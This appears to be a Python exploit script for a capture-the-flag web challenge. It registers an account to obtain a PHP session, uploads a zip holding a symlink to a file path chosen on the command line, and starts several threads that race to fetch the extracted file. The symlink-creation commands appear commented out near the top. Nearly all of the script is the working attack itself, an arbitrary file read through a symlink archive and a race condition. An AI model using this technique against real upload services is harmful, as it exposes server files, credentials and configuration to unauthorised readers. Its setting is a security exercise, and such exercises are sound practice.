import time
import requests
import threading
import string
from random import randint

base_url = 'http://web.ctf.ir:4444/'
login_url = base_url + 'login.php'
register_url = base_url + 'register.php'
upload_url = base_url + 'upload.php'


username = 'abcde'
password = 'test'
data = {'username': username, 'password': password}
s = requests.session()
r = s.post(register_url, data=data)
r = s.post(login_url, data=data)
session_id = s.cookies.get('PHPSESSID')
if not session_id:
    print('error when getting new session.')
    exit()

file_url = base_url + 'uploads/{}/out'.format(session_id)

# Creating symlink file
import sys, os
file_to_search = sys.argv[1]
# os.popen('rm out')
# os.popen('rm out.zip')
# os.popen('ln -s {} out'.format(file_to_search))
# os.popen('zip --symlinks -r out.zip out')

for i in range(1):

    def upload_file():
        files = {'upload_file': open('out.zip','rb')}
        r = s.post(upload_url, files=files, data={})

    def get_file():        
        r = s.get(file_url)
        text = r.text
        if r.status_code == 200:
            print(text)

    threading.Thread(target=upload_file).start()
    threading.Thread(target=get_file).start()
    threading.Thread(target=get_file).start()
    threading.Thread(target=get_file).start()
    threading.Thread(target=get_file).start()
    threading.Thread(target=get_file).start()
    threading.Thread(target=get_file).start()


